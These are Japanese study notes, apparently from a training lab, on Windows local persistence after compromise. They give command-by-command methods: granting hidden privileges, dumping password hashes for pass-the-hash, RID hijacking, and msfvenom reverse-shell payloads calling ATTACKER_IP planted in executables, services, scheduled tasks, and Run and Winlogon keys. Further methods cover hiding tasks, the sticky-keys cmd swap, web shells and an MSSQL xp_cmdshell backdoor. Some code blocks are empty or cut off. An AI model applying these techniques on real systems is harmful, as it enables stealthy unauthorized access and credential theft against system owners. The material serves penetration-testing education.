# 詳細

## Intro

- ターゲットの内部ネットワークへのInitial Accessを得た後、まずは持続性を確立することが、攻撃者として最初に行う作業の1つである
- つまり、Persistanceとは、Exploitの段階を繰り返さずにホストへのアクセスを回復する方法を作っておくこと（≒バックドア）
 ![[Pasted image 20230521161809.png]]

### なぜバックドアが必要なのか

 - 再エクスプロイトが常に可能とは限らない：不安定なエクスプロイトの中には、エクスプロイト中に脆弱なプロセスをkillし、接続が切れるかも
- Footholdを得ることは、再現性が低い：例えば、最初のアクセスにフィッシングキャンペーンを使用した場合、ホストへのアクセスを回復するためにそれを繰り返すのは難しい
- 管理者のパスワードのハッシュを保存しておき、それを再利用して接続することもできるが、これらのCredsが変更されてしまう危険性があるし、マシンに再びアクセスするためによりステルス性の高い方法がある。

## 非特権アカウントの改ざん

- 管理者のクレデンシャルを保持しておくのは、マシンの永続性を実現する最も簡単な方法
- しかし、ブルーチームに発見されにくくするためには、通常は管理者ほど監視されない「非特権ユーザ」を操作して、管理者権限を付与するのがいい

- ここでは、すでに管理者アクセス権を獲得しており、そこから永続性を確立しようとしていると仮定する

---

### Assign Group Memberships

- 非特権ユーザのクレデンシャルを入手しておく必要がある
- 非特権ユーザーに管理者権限を持たせる直接的な方法は、そのユーザーをAdministratorsグループの一員にすること

#### 方法１：Adminグループへの追加：ステルス性低

- ユーザをAdminグループに加える
```powershell
net localgroup administrators [username] /add
```

- Backup Operatorsグループを使用する方がベター

#### 方法２：Backup Operatorsグループへの追加

##### Backup Operatorsグループについての前提知識

- このグループのユーザは管理者権限を持たない
- しかし、設定されたDACLを無視して、システム上のあらゆるファイルやレジストリキーの読み取り/書き込みが許可される
	- [用語](../../../Misc/用語.md#ACL,%20DACL,%20ACE,%20ADのオブジェクトについて)
- SAMおよびSYSTEMレジストリハイブの内容をコピーすることができ、これを使用してすべてのユーザのパスワードハッシュを復元可能　→　任意の管理アカウントに簡単にエスカレートすることができる
	- [用語](../../../Misc/用語.md#SAM)

- つまり、Backup Operatorsグループはステルス性が<u>高い</u>うえに、==パスワードハッシュを自由に閲覧できる==

##### Backup Operatorsグループへの追加手法

BackUp Operators（目立たない）でパスワードハッシュを取得し、PTHでいつでもログインできるようにする：

1. AdminアカウントからユーザをBackup Operatorsグループに追加する
```powershell
net localgroup "Backup Operators" [username] /add
```

2. WinRMユーザグループに追加する
	- 理由：非特権アカウントは、RDPユーザまたはWinRMユーザグループに追加しない限り、マシンにRDPまたはWinRMで戻ることはできないから
```powershell
net localgroup "Remote Management Users" [username] /add
```
- この時点でRDP接続して`whoami /groups`としてみても、Backup Operatorsグループの権限は"Deny only SID"となっている（つまり権限なし）
- これはUACの<u>"LocalAccountTokenFilterPolicy"</u>のせい
	- LocalAccountTokenFilterPolicy：リモートでログインする際に、あらゆるローカルアカウントの管理者権限を剥奪してしまう

3. "LocalAccountTokenFilterPolicy"を無効にする
```powershell
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
```

4. 攻撃者のマシンからWinRM接続し、現在のグループに権限があるか確かめる
```zsh
evil-winrm -i [TargetIP] -u [username] -p [passwd]
```
```cmd
whoami /groups
```
- Backup Operatorsが"Deny only SID"ではない → 成功

	⇨上記２、３、４の手順の結果、Backup Operatorsとしての権限がWinRM/RDP経由でも有効化された。

5. `evil-winrm`セッションでSAMとSYSTEMファイルのバックアップを作成し、攻撃側のマシンにダウンロードする
```zsh
reg save hklm\system system.bak
reg save hklm\sam sam.bak
download system.bak
download sam.bak
```
	（winrmセッション上で`download`実行したファイルは攻撃者のマシンに保存される）

6. `evil-winrm`セッションを閉じ、後続のPTH(pass the hash)のため、攻撃者側でimpacketのsecretsdump.pyを使用して、全ユーザーのパスワードハッシュをダンプする
```zsh
impacket-secretsdump -sam sam.bak -system system.bak LOCAL
```
- `LOCAL`: スクリプトがローカル環境で実行されるようになり、リモートホストとのセキュリティチャンネルの設定や通信を必要としなくなる
- 表示された最後の部分のハッシュが使える

7. 攻撃者のマシンから、PTHでAdminアカウントになりすまして新たにwinrmでログイン
```zsh
evil-winrm -i [TargetIP] -u Administrator -H [Hash]
```
- PTHだと、イベントログにパスワード入力の形式が残らないのでステルス性が高い

### Special Privileges and Security Descriptors

#### 基本

- Backup Operatorsグループにユーザーを追加するのと同様の結果を、==グループメンバーシップを変更することなく==達成する
- [利用可能な特権の完全なリスト](https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants)
- Backup Operatorsグループの場合、デフォルトで以下の2つの特権が割り当てられている
	- SeBackupPrivilege：DACLを無視して、システム内のあらゆるファイルを読める
	- SeRestorePrivilege : ユーザは、DACLを無視して、システム内に任意のファイルを書き込める
- このような特権は、グループのメンバーシップに関係なく、どのユーザーにも割り当てられる。
- *secedit*(security configuration editor)を使用
	- セキュリティ設定のバックアップ（/export）
	- 設定のインポート（/import）
	- 設定の適用（/configure）

#### バックアップ・リストア特権付与の手法

1. まず、現在の設定をDBから、ファイルにエクスポートしカレントディレクトリに保存
```powershell
secedit /export /cfg config.inf
```

2. ファイルをnotepadで開き、SeBackupPrivilegeとSeRestorePrivilegeに関する設定の行にユーザ(ここでは`thmuser2`)を追加する
```powershell
start notepad config.inf
```
![[Pasted image 20230615155402.png]]
$$SeBackUpPrivilegeとSeRestorePrivilegeの編集$$

3. Backup Operatorと同等の権限を持つユーザにするため、`.inf`ファイルを`.sdb`ファイルに変換し、このファイルを使用してconfigをシステムにロードしなおす
	- `inf`ファイル：人間が読める形式の設定付ファイル
	- `sdb`ファイル：Windowsが理解可能な形式のセキュリティ設定DBで、`secedit`で設定を適用させるためにこの形式にする必要がある
```powershell
secedit /import /cfg config.inf /db config.sdb
```
```powershell
secedit /configure /db config.sdb /cfg config.inf
```
- `/import /cfg`:  指定したconfigをdbにインポートする
- `/configure /db xxx /cfg`：指定したdbの中のconfigを設定に適用する

- このユーザはまだWinRM経由でシステムにログインできないので、（リモート管理ユーザーグループにユーザーを追加する代わりに、）WinRMサービスに関連するSID（セキュリティ記述子）を変更して、ユーザ(ここでは`thmuser2`)が接続できるようにする

4. GUIでWinRMのセキュリティディスクリプタの設定画面を開く
```powershell
Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI
```

5. Add -> 追加したいユーザ -> Full Controllにチェック
![[Pasted image 20230615161519.png | 200]]

6. LocalAccountTokenFilterPolicyを無効にする
```powershell
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
```

7. あとは[3. Windows Local Persistence](3.%20Windows%20Local%20Persistence.md#Backup%20Operatorsグループへの追加手法)の4~7の流れと一緒。(グループには追加してないので`whoami /groups`は不要)

### RID Hijacking

#### RID Hijackingの基本

- 💥レジストリの値をいくつか変更して、OSに自分が管理者であると思わせる
- ユーザーが作成されると、Relative ID（RID）と呼ばれる識別子がユーザに割り当てられる。
- RIDは、単にシステム全体でユーザを表す識別子。ユーザがログオンすると、LSASSプロセスはSAMレジストリハイブからそのRIDを取得し、そのRIDに関連するアクセストークンを作成する。
- レジストリの値を改ざんできれば、両方のアカウントに同じRIDを関連付けることで、windowsに管理者アクセストークンを非特権ユーザーに割り当てさせることができる
- ⚠️：レジストリ編集はとても影響が大きいので細心の注意が必要

- Windowsシステムでは、デフォルトのAdministratorアカウントにはRID = 500が割り当てられ、一般ユーザーは通常RID >= 1000を持っている
- *psexec*を使用し、非特権ユーザにAdminと同じRIDを割り当てる：
	- *Regedit*を使用してSAMにアクセスする必要があるが、SAMはSYSTEMアカウントしかアクセスできない（Administratorでも編集不可）
	- psexecならRegeditを使用可

#### RID Hijackingの手法

1. Adminと非特権ユーザに割り当てられたRIDを見つける
```powershell
wmic useraccount get name,sid
```
![[Pasted image 20250518114408.png]]
$$RID出力一覧：RIDはSIDの最後のビット(Adminの場合500)$$

2. レジストリエディタを開くため、SYSTEM権限としてRegeditを実行する
	- (psexecは`C:\tools\pstools`にあることが多い)
```powershell
PsExec64.exe -i -s regedit
```
- `-i`: 対話型で開く
- `-s`: system権限で実行

3. レジストリエディタで`HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\`に移動
4. RIDを変更したい非特権ユーザのRIDを16進数に直して検索する。今回の例はthmuser3でRIDが1010(=03F2)
5. 対応するユーザーのRIDをクリックすると`F`という値があるのでクリックするとEdit Binary Valueポップアップが表示される
6. `0030`の行にユーザの実効RIDを保持している
	- 🚨リトルエンディアン表記でバイトが反転（03 F2 → F2 03）
![[Pasted image 20230615175042.png]]
$$レジストリエディタでRIDの編集画面を開いている状態$$

7. この2バイト（F2 03）を、AdministratorのRID（500）を16進数で表し（01F4）、リトルエンディアン表記したもの（F4 01）に置き換える
![[Pasted image 20230615175424.png]]
$$RID編集後の状態$$

8. 書き換えた非特権ユーザからログアウトし、再度ログインすると、Administratorとしてログインできる。
```zsh
xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:[TargetIP] /u:[user] /p:'[passwd]'
```

## ファイルのバックドア化

- 非特権アカウントの改ざん以外で、永続性を確立するもう一つの方法は、ユーザが定期的に操作することがわかっているいくつかのファイルを改ざんすること
- このようなファイルに何らかの変更を加えることで、ユーザがアクセスするたびに実行されるバックドアを仕込むことができる
- 攻撃者の正体がバレるような警告を出したくないので、改ざんしたファイルはユーザの期待通りに動作し続ける必要がある

### 実行可能ファイル（EXE）のバックドア化

- デスクトップ上に実行ファイルがあったら、そのユーザはその実行ファイルを頻繁に使っている可能性が高いと推測できる

- 例えば、デスクトップにPuTTYのショートカットが置いてあったとする
- ショートカットのTargetプロパティを確認すると、`C:\Program Files\PuTTY\putty.exe` を指していることがわかる
- 実行ファイルを攻撃者のマシンにダウンロードし、好きなペイロードを実行するように変更することができる

- msfvenom を使えば、任意の .exe ファイルに好みのペイロードを簡単に仕込める。
- バイナリは通常通り動作するが、バイナリに追加のスレッドを加えることで、追加のペイロードをサイレントに実行できる。

1. backdoorを仕込んだputty*X*.exeを作成する
```zsh
msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=[ATTACKER_IP] lport=[PORT] -b "\x00" -f exe -o puttyX.exe
```

2. 元の実行ファイル(putty.exe)とすりかえる

### ショートカットファイル（lnk）のバックドア化

- ショートカットファイル自体を改ざんする方法で、実行ファイルのプログラムを変更するよりステルス性が高い
- 💥期待される実行ファイルを直接指すのではなく、バックドアを実行したあと通常どおりプログラムを実行するスクリプトを指すように変更する

  - 例として、Administratorのデスクトップにあるcalcのショートカットを確認する。 

1. ショートカットを右クリックしてプロパティを表示し、Targetを確認する
![[Pasted image 20230615181924.png | 300]]

2. リバースシェルを実行した後、ショートカットのTargetプロパティにあった元の実行ファイル(`calc.exe`)を実行するスクリプトファイルを作成する
	- 作成場所は`C:\Windows\System32`など、目立たない場所にする
	- `nc64.exe`は必要に応じて攻撃者マシンからダウンロードさせておく
	- ncが実行できない場合は[What is the shell](../../../Cheatsheet/Common/What%20is%20the%20shell.md)を参照
```powershell

C:\Windows\System32\calc.exe
```

3. Targetプロパティを編集し、上記のスクリプトファイルを指すように変更する
```powershell
powershell.exe -w hidden C:\Windows\System32\[スクリプトファイル.ps1]
```
- `-w hidden`：実行時にウィンドウが表示されないようにする

3. Change Iconから、元のアイコン（ここでは電卓）を指定する
	なぜなら、ショートカットのアイコンが自動的に調整される場合があるから。
![[Pasted image 20230615182847.png | 300]]

4. 攻撃者のマシンでリバースシェルリスナーを立ち上げておき、ターゲットがショートカットファイルを実行するのを待つ

	⚠️：実行時、一瞬コマンドプロンプトが点滅するので気付かれる可能性はある

### Hijacking File Associations

- あらゆるファイルの関連付けをハイジャックして、ユーザが特定のファイルタイプを開くたびにOSにシェルを実行させる
- デフォルトのOSのファイル関連付けはレジストリ内に保持され、`HKLM\Software\Classes\`の下に各ファイルタイプのキーが保存される。
- 例えば、.txtファイルを開くのにどのプログラムが使われているかを調べたい場合、.txtのサブキーを調べて、どのProgrammatic ID（ProgID）がそれに関連しているかを調べる。
- ProgIDは、システムにインストールされているプログラムの識別子。.txtファイルの場合、次のようなProgIDを持つ

1. 特定のファイルタイプのProgIDを調べる
 ![[Pasted image 20230615183811.png | 500]]

2. ProgIDをCtrl + Fでkeyにチェックを入れて検索する
 ![[Pasted image 20230615184537.png | 300]]

3. ファイルの処理を担当するプログラムへの参照を見つける
![[Pasted image 20230615184706.png | 400]]
- この場合、.txtファイルを開こうとすると、システムは`%SystemRoot%system32\NOTEPAD.EXE %1`を実行する。
- %1は開いたファイルの名前を表す。この拡張子を乗っ取りたい場合、コマンドをバックドアを実行したあと通常通りファイルを開くスクリプトに置き換える。

## Servicesの悪用

- Windowsサービスは、ターゲットマシンが起動するたびにバックグラウンドで実行されるように設定できるため、永続性を確立するのに**最適な方法**。  
- サービスは、基本的にバックグラウンドで実行される実行ファイル。サービスを設定する際には、どの実行ファイルを使用するかを定義し、マシンの起動時に自動的に実行されるか、手動で起動されるかを選択する
  
- サービスを利用して永続性を確立する2つの方法↓

### Creating backdoor services

###### パスワードの変更
- 起動時にパスワードを変更するサービスを作成し起動する
```powershell
sc.exe create [service] binPath= "net user Administrator Passwd123" start= auto
sc.exe start [service]
```
- 注：コマンドが機能するためには、各等号の後にスペース
- AdministratorのパスワードがPasswd123にリセットされるコマンド。

###### reverse shellの確立
1. ペイロードの作成
```zsh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=[ATTACKER_IP] LPORT=[PORT] -f exe-service -o [unique file].exe
```
- file名は絶対ユニークでないといけない。

2. ターゲットのwindowsマシンにファイル転送
```zsh
python -m http.server
```
```powershell
Invoke-WebRequest -Uri 'http://[IP]:[Port]/[unique file].exe' -OutFile 'C:\Windows\Sytem32\[unique file].exe'
```

3. サービスを作成し起動する
```powershell
sc.exe create [service] binPath= "C:\windows\system32\[unique file].exe" start= auto
sc.exe start [service]
```

### Modifying existing services
- 永続化のために新しいサービスを作成することは非常にうまくいくが、ブルーチームはネットワーク全体で新しいサービスの作成を監視する可能性がある。
- 検出を避けるために、既存のサービスを再利用する。無効化されたサービスは、ユーザに気づかれずに変更できる可能性がある
  
1. 利用可能なサービスの一覧を取得する
```powershell
sc.exe query state=all
```
- Stateがstoppedがいいかも

2. サービスの詳細を取得
```powershell
sc.exe qc THMService3
```

- 以下の条件を満たしているか確認・満たすよう変更
	- "BINARY_PATH_NAME"が攻撃者の作成したペイロードを指すように変更する(よく使われそうなのは怖い)
	- 最初から"START_TYPE"がAuto_Startになっているか確認
	- "SERVICE_START_NAME"はサービスを実行するアカウントなので、SYSTEM権限を得るためにLocalSystemに変更する

3. ペイロードを作成する
```zsh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=[ATTACKER_IP] LPORT=[PORT] -f exe-service -o [unique file].exe
```

4. ターゲットのwindowsマシンにファイル転送
```zsh
python -m http.server
```
```powershell
Invoke-WebRequest -Uri 'http://[IP]:[Port]/[unique file].exe' -OutFile 'C:\Windows\Sytem32\[unique file].exe'
```

5. サービスのパラメータを再設定する
```powershell
sc.exe config [service] binPath= "C:\Windows\rev-svc2.exe" start= auto obj= "LocalSystem"
```
- `obj= "LocalSystem"`:サービスが"LocalSystem"アカウントで実行されるように"SERVICE_START_NAME"を変更する

6. サービスの再設定がうまく行ったか確認する
```powershell
sc.exe qc [service]
```

7. 攻撃マシンにリスナーを立てたうえで、ユーザに再度サインインするか、サービスをスタートする。

## Scheduled Tasksの悪用

- 永続性を確保するペイロードの実行をスケジュールする

### Creating Schtasks
- タスクスケジューラーを使用する
- タスクの開始時間を細かく制御することができ、特定の時間に起動したり、定期的に繰り返したり、特定のシステムイベントが発生したときに起動したり
- schtasksでタスクスケジューラを操作する
- [schtasksについて](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks)のcreateのところから以下のコマンドの詳細を見れる
  
1. 1分ごとにリバースシェルを実行するタスクを作成する(実際はそんなに頻繁にペイロードを実行しない)
```powershell
schtasks /create /sc minute /mo 1 /tn [task name] /tr "c:\tools\nc64 -e cmd.exe [ATTACKER_IP] [PORT]" /ru SYSTEM
```
- `/sc /mo`: scで時分秒を指定し、moで具体的な値を指定。
- `/tr`: task to run

2. タスクが正常に作成されたか確認
```powershell
schtasks /query /tn [task name]
```

### SceTasks Invisible
- スケジュールされたタスクをさらに隠すために、その*SD*(セキュリティディスクリプタ)を削除することで、システム内のどのユーザーからも見えないようにする
- SDというACLは、どのユーザーがスケジュールタスクにアクセスできるかを示す
- このACLがないとWindowsは使用権限があるタスクのみを表示するため、みえなくなる。
- SDを削除することにより、管理者を含むすべてのユーザがスケジュールタスクへのアクセスを許可されなくなる

- すべてのSchtasksのSDは、 `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\`に保存される。
- タスクごとにレジストリキーがあり、その下にある"SD"という名前の値には、SDが含まれている。この値を消去できるのは、SYSTEM権限を持っている場合のみ

3. SYSTEM権限でRegeditを開く
```powershell
c:\tools\pstools\PsExec64.exe -i -s regedit
```

4. 作成したSchtaskのSDを削除(`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\`)
![[Pasted image 20230616103401.png | 400]]

5. 削除されて閲覧できないか確認する
```powershell
schtasks /query /tn [task name]
```
- " ERROR: The system cannot find the file specified."でOK

## ログオンをトリガーにpersistance

- ユーザがシステムにログインしたときに実行されるペイロードを仕込む

### Startup folder
###### 基本
- 各ユーザは`C:\Users\[username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`の下にAppDataというフォルダを持ち、そこにユーザがログインしたときに実行される実行ファイルを置くことができる。
- 攻撃者は、そこにペイロードをドロップするだけで、永続性を実現することができる。各ユーザは、自分のフォルダで利用可能なものだけを実行する
- ログイン時に==全ユーザ==に強制的にペイロードを実行させたい場合は、`C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp`にペイロードをドロップする

#####  Startup手順
1. リバースシェルペイロードを作成する
```zsh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=[ATTACKER_IP] LPORT=[PORT] -f exe -o [file].exe
```

2. ターゲットにコピーする
```zsh
python -m http.server
```
- 今回は全ユーザ対象なので以下のパスに
```powershell
Invoke-WebRequest -Uri 'http://[IP]:[Port]/[file].exe' -OutFile 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\[file].exe'
```

3. 成功か確認するために、攻撃者にリスナーを立て、RDP接続しているマシンから==Sign Out==し再度RDP接続

### Run / RunOnce
###### 基本
- レジストリを使用して、ログオン時にプログラムを実行するよう強制することも可能。
- ペイロードを特定のディレクトリに配信する代わりに、以下のレジストリエントリを使用して、==ログオン時に実行するアプリケーションを指定する==ことができる：
	- `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
	- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
	- `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
	- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- ==HKCU==のレジストリ項目は==現在のユーザにのみ==適用され、==HKLM==のレジストリ項目は==すべてのユーザーに適用==される
- Runキーで指定されたプログラムは、ユーザがログオンするたびに実行される。RunOnceキーで指定されたプログラムは、1回だけ実行される。

##### Run手順
1. リバースシェルのペイロードを作成
```zsh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=[ATTACKER_IP] LPORT=[PORT] -f exe -o [file].exe
```

2. ターゲットにコピーする(`C:\Windows\に`)
```zsh
python -m http.server
```
```powershell
Invoke-WebRequest -Uri 'http://[IP]:[Port]/[file].exe' -OutFile 'C:\Windows\[file].exe'
```

3. Regeditを開く
```powershell
c:\tools\pstools\PsExec64.exe -i -s regedit
```

4. 右クリック->New->Expandable String valueで`REG_EXPAND_SZ`レジストリエントリ(名前はなんでもいい)を作成し、エントリを右クリック-> Modify->Value dataにログオン時に実行するファイルを指定する
![[Pasted image 20230616111541.png]]

5. 成功か確認するために、攻撃者にリスナーを立て、RDP接続しているマシンからSign Outし再度RDP接続

### Winlogon
###### 基本
- 認証直後にユーザープロファイルをロードするWindowsコンポーネントであるWinlogonを悪用する方法
- Winlogonは、`HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\`の下にあるいくつかのレジストリキーを使用し、永続性を得るためにおもしろいことができる：
	- `Userinit`は`userinit.exe`を指し、ユーザプロファイルの環境設定を復元する
	- `shell`は、システムのシェル（通常は`explorer.exe`）を指す
![[Pasted image 20230616114612.png | 600]]
- 実行ファイルをリバースシェルに置き換えると、ログオンシーケンスを壊してしまう。しかし、==カンマで区切られたコマンドを追加すると、Winlogonはそれらをすべて処理する==

##### Winlogon手順
1. [3. Windows Local Persistence](3.%20Windows%20Local%20Persistence.md#Run手順)の3まで一緒
2. `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\`にある`Shell`か`Userinit`のどちらかのValue Dataに`,`で区切りを入れてペイロードのパスを指定する
![[Pasted image 20230616115410.png | 400]]

3. 成功か確認するために、攻撃者にリスナーを立て、RDP接続しているマシンからSign Outし再度RDP接続

### Logon scripts
###### 基本
- ユーザプロファイルのロード中に`userinit.exe`が行うことの1つに、`UserInitMprLogonScript`という環境変数があるかどうかを確認することがある。
- この環境変数を使用して、マシンにログインするときに実行されるログオンスクリプトをユーザに割り当てることができる。
- この環境変数はデフォルトでは設定されていないので、この==変数を作成して好きなスクリプトを割り当てる==ことができる
- 各ユーザは==それぞれ独自の環境変数を持っている==ことに注意。したがって、それぞれ個別にバックドアを作成する必要がある

##### Logon Script手順
1. [3. Windows Local Persistence](3.%20Windows%20Local%20Persistence.md#Run手順)の3まで一緒
2. `HKCU\Environment`に移動し`UserInitMprLogonScript`のレジストリエントリ（`REG_EXPAND_SZ`)を作成し、作成したペイロードをValue Dataに入れる
![[Pasted image 20230616121702.png]]
- このレジストリキーは`HKLM`に相当するものがないため、バックドアを現在のユーザーにのみ適用させることになる。

## Backdooring the Login Screen w/ RDP

- マシンに物理的にアクセスできれば（RDPなどで）、マシンの有効な認証情報を持っていなくても、ログイン画面をバックドアにして端末にアクセスできる
- アクセシビリティ機能を悪用する

### Sticky Keys
###### 基本
- CTRL + ALT + DELのようなキーの組み合わせを押すとき、WindowsではSticky Keyを使用するように設定することができ、これにより、組み合わせのボタンを同時に押すのではなく、順次押すことができる。
- その意味で、Sticky keyが有効な場合、CTRLを押して離し、ALTを押して離し、最後にDELを押して離せば、CTRL + ALT + DELの組み合わせを押したのと同じ効果を得ることができる。
- Sticky keyを使って永続性を確立するために、Windowsのインストール時にデフォルトで有効になっている、SHIFTを5回押すことでSticky Keyを有効にするショートカットを使用する。ショートカットを入力すると、通常、次のような画面が表示されるはず：
![[Pasted image 20230616133509.png | 300]]

- SHIFTを5回押すと、Windowsは`C:\Windows\System32\sethc.exe`にあるバイナリを実行する。このようなバイナリを好みのペイロードに置き換えることができれば、ショートカットを使ってそれを起動することができる。
- ==認証情報を入力する前にログイン画面からこれを実行することも可能==
- ログイン画面をバックドア化する簡単な方法は、`sethc.exe`を`cmd.exe`のコピーに置き換えること。
- そうすれば、ログ画面からでも、Sticky keyのショートカットを使ってコンソールを起動することができる。
- `sethc.exe`を上書きするには、まずファイルの所有権を取得し、現在のユーザに変更する権限を与える必要がある。

##### Sticky key 手順
1. 所有権を獲得する
```powershell
takeown /f c:\Windows\System32\sethc.exe
```
- `/f`: fileを指定

2. ファイルの完全なアクセス権を与える
```powershell
icacls C:\Windows\System32\sethc.exe /grant Administrator:F
```

3. `sethc.exe`を`cmd.exe`に置き換える
```powershell
copy c:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
```
- `Overwrite C:\Windows\System32\sethc.exe? (Yes/No/All): yes`とすることで、中身だけ上書きする

4. 確認のために、Sign outではなくLockを選択し、認証情報入力画面からcmdを起動できるか試す。

## 既存のサービスを通しての永続化

- バックドアを隠すためにWindowsの機能を使わない方法
- コードを実行するために使用できる既存のサービスを使う。
- ここでは、Webサーバのセットアップにバックドアを仕込む。
- しかし、実行する内容をある程度コントロールできる他のアプリケーションも、同様にバックドア化できる

### Web Shellsの使用
###### 基本
- Webサーバで永続性を実現する一般的な方法は、WebディレクトリにWebシェルをアップロードすること。
- これは簡単で、IIS(windowsの無料のwebサーバ) で設定されたユーザ（デフォルトでは`iis apppool\defaultapppool`)の権限でアクセスできるようになる。
- これが非特権ユーザーであっても、特別な`SeImpersonatePrivilege`を持つため、既知のさまざまな悪用を使用して管理者にエスカレートする簡単な方法。
- この特権を悪用する方法の詳細[Win PrivEsc](../../../../Win%20PrivEsc.md#SeImpersonate%20/%20SeAssignPrimaryToken)

##### web shell手順
1. [ASP.NETのwebshell](https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmdasp.aspx)を攻撃者マシンにダウンロードする
2. Webroot（Webサーバー上で公開されるウェブサイトのファイルが格納されるディレクトリ）はデフォルトでは`C:\inetpub\wwwroot`にあるのでそこにペイロードを格納する
```zsh
python -m http.server
```
```powershell
Invoke-WebRequest -Uri 'http://[AttackerIP]:[PORT]/[file]' -OutFile 'C:\inetpub\wwwroot\[file]'
```

3. 作成/転送方法によっては、ファイルのパーミッションによってWebサーバーがアクセスできない場合がある。シェルのURL にアクセスする際に Permission Denied エラーが発生する場合は、
```powershell

```

4. URLにアクセスする

### バックドアとしてMSSQLの使用
###### 基本
- MSSQL Serverのインストーラにトリガーを悪用してバックドアを仕込む方法
- MSSQLのトリガーは、DBで特定のイベントが発生したときに実行されるアクションをバインドする。
- ここでは、例として`HRDB` DBへのあらゆるINSERTのためのトリガーを作成する

- トリガーを作成する前に、まずDB上でいくつか再設定する。
- `xp_cmdshell`は、MSSQLインストール時にデフォルトで提供されるストアドプロシージャで、システムのコンソールで直接コマンドを実行することができるが、デフォルトでは無効にされている

##### MSSQL手順
1. `xp_cmdshell`を有効にするために、スタートメニューから`Microsoft SQL Server Management Studio 18`を開く。
- 認証を求められたら、現在のWindowsユーザの認証情報でログオンする。
- デフォルトでは、ローカルのAdministratorアカウントがすべてのDBへのアクセス権を持つ
- 以降のSQLコマンドは実行のためにコマンドごとに==▶️Executeを押す==

2. New Queryを押してquery editorを開き、"Advanced Options"と`xp_cmdshell`を有効にする
```sql
sp_configure 'Show Advanced Options',1;
RECONFIGURE;
GO
```
- "Configuration option 'show advanced options' changed from 0 to 1"で成功。コマンドを消す

```sql
sp_configure 'xp_cmdshell',1;
RECONFIGURE;
GO
```
- "Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install."と表示されるので
```sql
RECONFIGURE;
GO
```

- DBにアクセスするすべてのWebサイトが`xp_cmdshell`を実行できるようにする必要がある。
- デフォルトでは、`sysadmin`ロールを持つDBユーザのみがこれを実行できる。Webアプリケーションでは制限されたDBユーザを使用することが想定されるので以下のことを実行する

3. デフォルトのDB管理者である`sa`ユーザになりすますための権限をすべてのユーザに付与する
```sql
USE master

GRANT IMPERSONATE ON LOGIN::sa to [Public];
```


5. HRDBデータベースのEmployeesテーブルにINSERTが行われる度に実行されるトリガーを構成
```sql
CREATE TRIGGER [sql_backdoor]
```
